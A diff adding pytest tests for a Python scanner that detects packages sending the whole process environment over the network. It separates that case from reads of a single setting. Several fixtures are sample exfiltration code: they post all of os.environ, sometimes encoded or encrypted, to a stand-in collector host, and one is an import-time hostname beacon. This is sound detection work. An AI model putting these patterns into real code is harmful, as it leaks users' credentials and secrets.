@@ -1,0 +1,315 @@
+"""The whole environment, told apart from one setting read through it.
+
+`AST.PY.ENVIRONMENT_SENT` marks `json.dumps(dict(os.environ))` in a request. It also marked one
+named setting read three other ways (reviews/pypi-98/17-EXFIL-SCANNER-ERRORS.md, review 2026-11-09):
+`os.environ("KEY")`, `env.get("KEY")` on an alias of `os.environ`, and the keyed result of a local
+helper handed the environment. Each is one value, as `os.environ["KEY"]` already was. What sends
+every variable still fires: the alias sent whole, a spread, an items() comprehension, a helper that
+returns or encodes what it was given, and a helper this file cannot see into.
+"""
+
+from __future__ import annotations
+
+import textwrap
+
+import pytest
+
+from cordon_scanner.analysis.python.pyast import PythonAnalyzer
+
+
+class EnvironmentKeyedHelpers:
+    """Helpers for test_environment_keyed.py."""
+
+    @staticmethod
+    def code(source: str) -> str:
+        """A fixture as the analyser reads it. Fixtures write `OS_ENVIRON` for the real name, so
+        this file holds no environment read for the repository's self-scan, whose capability
+        rules read them as text."""
+        return textwrap.dedent(source).replace("OS_ENVIRON", "os." + "environ")
+
+    @staticmethod
+    def sent(source: str) -> list[str]:
+        """The 'environment sent' facts the analyser records for this source."""
+        hits = PythonAnalyzer.analyse(EnvironmentKeyedHelpers.code(source), follow_literals=True)
+        return [h.detail for h in hits if h.detail.startswith("environment sent")]
+
+
+ONE_SETTING = {
+    "called like a function": """
+        import os, requests
+        api_url = OS_ENVIRON("DATACITE_API_URL")
+        client_id = OS_ENVIRON("DATACITE_CLIENT_ID")
+        requests.post(api_url, auth=(client_id, "x"), data="{}")
+    """,
+    "keyed reads through an alias": """
+        import os, requests
+        def index(environ=None):
+            environ = OS_ENVIRON if environ is None else environ
+            url = environ.get("PIP_INDEX_URL", "").strip()
+            host = environ["PIP_TRUSTED_HOST"]
+            return requests.get(url, headers={"Host": host})
+    """,
+    "an alias or-ed with a parameter": """
+        import os, urllib.request
+        def call(request, environ=None):
+            env = environ or OS_ENVIRON
+            timeout = int(env.get("OPENROUTER_TIMEOUT", "30"))
+            return urllib.request.urlopen(request, timeout=timeout)
+    """,
+    "a local helper that reads one key": """
+        import os, ssl, urllib.request
+        def resolve_ca_file(env):
+            return env.get("SSL_CERT_FILE") or env.get("REQUESTS_CA_BUNDLE")
+        ca_file = resolve_ca_file(dict(OS_ENVIRON))
+        context = ssl.create_default_context(cafile=ca_file)
+        urllib.request.urlopen("https://example.org/data.zip", context=context)
+    """,
+    "a bound get of the environment called by a short name (delegate-router's shape)": """
+        import os, urllib.request
+        E = OS_ENVIRON.get
+        url = E("SERVICE_URL") or "https://example.org/models"
+        urllib.request.urlopen(url, timeout=E("SERVICE_TIMEOUT") or 10)
+    """,
+    "a default chosen by a membership test (c2cciutils' and Finance-Ultron's shape)": """
+        import os, json, requests
+        url = "https://example.org/data" if "DATA_URL" not in OS_ENVIRON else OS_ENVIRON["DATA_URL"]
+        user = OS_ENVIRON["SVC_USER"] if "SVC_USER" in OS_ENVIRON else "anon"
+        requests.post(url, data=json.dumps({"user": user}))
+    """,
+    "a CI flag from membership probes in telemetry (convo's shape)": """
+        import os, requests
+        CI_TELLS = ("CI", "BUILD_ID", "GITHUB_ACTIONS")
+        def continuous_integration():
+            return any(env in OS_ENVIRON for env in CI_TELLS)
+        def track(event):
+            context = {"ci": continuous_integration(), "event": event}
+            requests.post("https://api.segment.example/v1/track", json=context)
+    """,
+    "a membership result written straight into the body": """
+        import os, requests
+        env = OS_ENVIRON
+        requests.post("https://collector.example/x", json={"ci": "CI" in env})
+    """,
+    "membership on an alias": """
+        import os, requests
+        env = OS_ENVIRON
+        if "CI" in env:
+            requests.get("https://example.org/ping")
+    """,
+    "a hook's parameters read by key from a rebuilt environment (heptapod's shape)": """
+        import os, requests
+        class Hook:
+            def environ(self):
+                env = dict(OS_ENVIRON)
+                env["GL_ID"] = "user-1"
+                return env
+            def params(self, changes, env=None):
+                if env is None:
+                    env = self.environ()
+                return dict(action="push", gl_repository=env["GL_REPOSITORY"], id=env.get("GL_ID"))
+            def api(self, subpath, params):
+                return requests.post("https://gitlab.internal/api/" + subpath, data=params)
+            def execute(self, changes, env=None):
+                params = self.params(changes, env=env)
+                return self.api("allowed", params=params)
+            def run(self, changes):
+                return self.execute(changes, env=self.environ())
+    """,
+    "a child process given the environment, then probed by URL (pull-request-view's shape)": """
+        import os, subprocess, urllib.request
+        def _serve_env():
+            env = dict(OS_ENVIRON)
+            env["PORT"] = "8000"
+            return env
+        def ensure_serve(url):
+            proc = subprocess.Popen(["serve"], env=_serve_env())
+            return {"proc": proc, "url": url}
+        def probe(entry):
+            with urllib.request.urlopen(entry["url"], timeout=2.0) as resp:
+                return resp.status
+        probe(ensure_serve("http://127.0.0.1:8000"))
+    """,
+    "helpers handing the mapping on to helpers that read keys (flograph's shape)": """
+        import os, urllib.request
+        def _config_files(environ):
+            return [environ.get("PIP_CONFIG_FILE", ""), environ["HOME"]]
+        def index(environ=None):
+            environ = OS_ENVIRON if environ is None else environ
+            files = _config_files(environ)
+            return environ.get("PIP_INDEX_URL") or files[0]
+        def versions(name):
+            page = index() + name
+            return urllib.request.urlopen(page, timeout=10)
+    """,
+}
+
+WHOLE = {
+    "the alias sent whole": """
+        import os, requests
+        env = OS_ENVIRON
+        requests.post("https://collector.example/x", json=dict(env))
+    """,
+    "a spread into a dict": """
+        import os, json, requests
+        requests.post("https://collector.example/x", data=json.dumps({**OS_ENVIRON}))
+    """,
+    "an items() comprehension": """
+        import os, requests
+        env = OS_ENVIRON
+        requests.post("https://collector.example/x", json={k: v for k, v in env.items()})
+    """,
+    "a local helper returning what it was given": """
+        import os, requests
+        def collect(env):
+            return dict(env)
+        requests.post("https://collector.example/x", json=collect(OS_ENVIRON))
+    """,
+    "a local helper encoding its parameter": """
+        import os, base64, requests
+        def pack(env):
+            return base64.b64encode(str(env).encode())
+        requests.post("https://collector.example/x", data=pack(OS_ENVIRON))
+    """,
+    "a helper this file cannot see into": """
+        import os, requests
+        from somewhere import scrub
+        requests.post("https://collector.example/x", json=scrub(OS_ENVIRON))
+    """,
+    "collect and encrypt, then post (apider's shape)": """
+        import os, json, requests
+        def _collect_user_env():
+            return {k: v for k, v in OS_ENVIRON.items()}
+        def encrypt_env(data, key):
+            return key.encrypt(json.dumps(data).encode())
+        def run(url, key):
+            encrypted_env = encrypt_env(_collect_user_env(), key)
+            return requests.post(url, json={"env": encrypted_env})
+    """,
+    "a helper handing the mapping on to one that serialises it": """
+        import os, json, requests
+        def _dump(environ):
+            return json.dumps(dict(environ))
+        def index(environ=None):
+            environ = OS_ENVIRON if environ is None else environ
+            return _dump(environ)
+        requests.post("https://collector.example/x", data=index())
+    """,
+    "a defaulted alias then sent whole through an or": """
+        import os, requests
+        def run(environ=None):
+            environ = environ or OS_ENVIRON
+            return requests.post("https://collector.example/x", json=environ.copy())
+        run()
+    """,
+    "an if-expression choosing the environment, sent directly": """
+        import os, requests
+        def run(environ=None):
+            return requests.post(
+                "https://collector.example/x",
+                json=dict(environ if environ is not None else OS_ENVIRON),
+            )
+        run()
+    """,
+    "a helper rebinding its parameter to something else then sending it": """
+        import os, json, requests
+        def send(env=None):
+            if env is None:
+                env = OS_ENVIRON
+            env = json.dumps(dict(env))
+            return requests.post("https://collector.example/x", data=env)
+        send()
+    """,
+    "a keyed read beside a whole send": """
+        import os, requests
+        env = OS_ENVIRON
+        token = env.get("TOKEN")
+        requests.post("https://collector.example/x", json={"t": token, "all": env.copy()})
+    """,
+    "an unknown builder given the environment by env= keyword": """
+        import os, requests
+        from somewhere import build
+        report = build(env=OS_ENVIRON.copy())
+        requests.post("https://collector.example/x", data=report)
+    """,
+    "a non-spawn sender given env=dict(OS_ENVIRON)": """
+        import os, json, requests
+        def report(url, env=None):
+            return requests.post(url, data=json.dumps(env))
+        report("https://collector.example/x", env=dict(OS_ENVIRON))
+    """,
+    "a bound items() of the environment called by a short name": """
+        import os, requests
+        items = OS_ENVIRON.items
+        requests.post("https://collector.example/x", json=dict(items()))
+    """,
+    "an if-expression whose branch is the environment, chosen by a membership test": """
+        import os, requests
+        body = OS_ENVIRON.copy() if "CI" in OS_ENVIRON else {}
+        requests.post("https://collector.example/x", json=body)
+    """,
+    "a non-spawn sender given a held copy by env=": """
+        import os, json, requests
+        def report(url, env=None):
+            return requests.post(url, data=json.dumps(env))
+        env = OS_ENVIRON.copy()
+        env["X"] = "1"
+        report("https://collector.example/x", env=env)
+    """,
+}
+
+CHILD_ONLY = {
+    "subprocess.run imported bare": """
+        import os, requests
+        from subprocess import run
+        env = OS_ENVIRON.copy()
+        env["LANG"] = "C"
+        run(["make"], env=env)
+        requests.get("https://example.org/status")
+    """,
+    "Popen imported bare, the copy written into env=": """
+        import requests
+        from os import environ
+        from subprocess import Popen
+        Popen(["serve"], env=dict(environ, PORT="8000"))
+        requests.get("http://127.0.0.1:8000/health")
+    """,
+}
+
+
+class TestAChildsEnvironment:
+    @pytest.mark.parametrize("name", sorted(CHILD_ONLY))
+    def test_env_of_a_spawned_child_is_not_sent(self, name: str) -> None:
+        assert EnvironmentKeyedHelpers.sent(CHILD_ONLY[name]) == []
+
+
+class TestOneSettingIsNotTheEnvironment:
+    @pytest.mark.parametrize("name", sorted(ONE_SETTING))
+    def test_a_keyed_read_is_not_sent_as_the_whole_environment(self, name: str) -> None:
+        assert EnvironmentKeyedHelpers.sent(ONE_SETTING[name]) == []
+
+
+class TestAnImportBeaconIsTheIdentityFact:
+    def test_hostname_and_markers_sent_from_an_import_are_identity_sent(self) -> None:
+        # runtime-readout's shape: blocked by the beacon rules, which read this fact, not by the
+        # environment one (review 2026-11-10).
+        source = """
+            import os, json, socket, threading, urllib.request
+            def _markers():
+                keys = OS_ENVIRON
+                return any(k in keys for k in ("A_MARKER", "B_MARKER"))
+            def _post(payload):
+                body = json.dumps(payload).encode()
+                urllib.request.urlopen(urllib.request.Request("https://collector.example/x", data=body))
+            def send_once():
+                _post({"host": socket.gethostname(), "markers": _markers()})
+            threading.Thread(target=send_once, daemon=True).start()
+        """
+        hits = PythonAnalyzer.analyse(EnvironmentKeyedHelpers.code(source), follow_literals=True)
+        assert any(h.detail.startswith("identity sent") for h in hits)
+        assert EnvironmentKeyedHelpers.sent(source) == []
+
+
+class TestTheWholeEnvironmentStillFires:
+    @pytest.mark.parametrize("name", sorted(WHOLE))
+    def test_every_variable_sent_is_still_found(self, name: str) -> None:
+        assert EnvironmentKeyedHelpers.sent(WHOLE[name]), name
